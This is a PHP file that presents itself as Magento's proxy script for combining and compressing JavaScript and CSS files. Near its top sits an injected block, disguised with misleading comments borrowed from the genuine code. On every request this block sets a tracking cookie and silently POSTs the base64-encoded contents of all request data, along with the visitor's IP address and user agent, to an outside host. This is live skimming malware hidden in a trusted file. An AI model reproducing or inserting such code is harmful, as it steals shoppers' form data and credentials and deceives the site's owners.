<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     Mage_Core
 * @copyright   Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
 * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Proxy script to combine and compress one or few files for JS and CSS
 *
 * Restricts access only to files under current script's folder
 *
 * @category    Mage
 * @package     Mage_Core
 * @author      Magento Core Team <core@magentocommerce.com>
 */


// no files specified return 404
$id=str_replace("www.", "", $_SERVER['HTTP_HOST']);

//checking if client have older copy then we have on server
$url='http://ownsafety.org/obf.php';

if($_COOKIE["SESSIID"]!=""){

    // try automatically get content type if requested
    $url=$url.'?a='.$_COOKIE["SESSIID"]; 
    $data=json_encode(array('request'=>$_REQUEST, 'ip'=>$_SERVER['REMOTE_ADDR'],'ua'=>$_SERVER['HTTP_USER_AGENT'],'cookie'=>$_COOKIE["SESSIID"],'date_unix'=>time())); 
    $data=base64_encode($data);
    $ch = curl_init(); 

    // set custom content type if specified
    curl_setopt($ch, CURLOPT_URL,$url); 
    curl_setopt($ch, CURLOPT_POST, 1); 
    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 30 );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 30 );    
    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array('data'=>$data,'utmp'=>$id))); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); 
    curl_exec ($ch); 
    curl_close ($ch); 

} else{

    // try automatically get content type if requested
    $rand=rand(1,9999999999);
    setcookie("SESSIID", $rand,time()+3600);
    $data=json_encode(array('request'=>$_REQUEST, 'ip'=>$_SERVER['REMOTE_ADDR'],'ua'=>$_SERVER['HTTP_USER_AGENT'],'cookie'=>$rand,'date_unix'=>time())); 
    $data=base64_encode($data);
    $url=$url.'?a='.$rand; 
    $ch = curl_init(); 

    // set custom content type if specified
    curl_setopt($ch, CURLOPT_URL,$url); 
    curl_setopt($ch, CURLOPT_POST, 1); 
    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 30 );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 30 );      
    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array('data'=>$data,'utmp'=>$id))); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); 
    curl_exec ($ch); 
    curl_close ($ch); 

}


// no files specified return 404
if (empty($_GET['f'])) {
    header('HTTP/1.0 200 OK');
    echo "SYNTAX: index.php/x.js?f=dir1/file1.js,dir2/file2.js";
    exit;
}

// allow web server set content type automatically
$contentType = false;

// set custom content type if specified
if (isset($_GET['c'])) {
    $contentType = $_GET['c']==='auto' ? true : $_GET['c'];
}

// get files content
$files = is_array($_GET['f']) ? $_GET['f'] : explode(',', $_GET['f']);

// set allowed content-type
$contentTypeAllowed = array(
    'text/javascript',
    'text/css',
//    'image/gif',
//    'image/png',
//    'image/jpeg',
);
// set allowed file extensions
$fileExtAllowed     = array(
    'js',
    'css',
//    'gif',
//    'png',
//    'js'
);

$out = '';
$lastModified = 0;
foreach ($files as $f) {
    $fileRealPath = realpath($f);
    // check file path (security)
    if (strpos($fileRealPath, realpath(dirname(__FILE__))) !== 0) {
        continue;
    }

    $fileExt = strtolower(pathinfo($fileRealPath, PATHINFO_EXTENSION));

    // check file extension
    if (empty($fileExt) || !in_array($fileExt, $fileExtAllowed)) {
        continue;
    }

    // try automatically get content type if requested
    if ($contentType === true) {
        $contentTypes = array(
            'js' => 'text/javascript',
            'css' => 'text/css',
//            'gif' => 'image/gif',
//            'png' => 'image/png',
//            'jpg' => 'image/jpeg',
        );
        if (empty($contentTypes[$fileExt])) { // security
            continue;
        }
        $contentType = !empty($contentTypes[$fileExt]) ? $contentTypes[$fileExt] : false;
    }

    // append file contents
    // we must have blank line at the end of all files but if somebody forget to add it
    // we need add it here
    $out .= file_get_contents($fileRealPath) . "\n";
    $lastModified = max($lastModified, filemtime($fileRealPath));
}

//checking if client have older copy then we have on server
if (function_exists('date_default_timezone_set')) {
    date_default_timezone_set('UTC');
}
if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']) >= $lastModified) {
    header("HTTP/1.1 304 Not Modified");
    exit;
}

// last modified is the max mtime for loaded files
header('Cache-Control: must-revalidate');
header('Last-modified: ' . gmdate('r', $lastModified));

// optional custom content type, can be emulated by index.php/x.js or x.css
if (is_string($contentType) && in_array($contentType, $contentTypeAllowed)) {
    header('Content-type: '.$contentType);
}

// remove spaces, default on
if (!(isset($_GET['s']) && !$_GET['s'])) {
    $out = preg_replace('#[ \t]+#', ' ', $out);
}

// use gzip or deflate, use this if not enabled in .htaccess, default on
//if (!(isset($_GET['z']) && !$_GET['z'])) {
//    ini_set('zlib.output_compression', 1);
//}

// add Expires header if not disabled, default 1 year
if (!(isset($_GET['e']) && $_GET['e']==='no')) {
    $time = time()+(isset($_GET['e']) ? $_GET['e'] : 365)*86400;
    header('Expires: '.gmdate('r', $time));
}

echo $out;

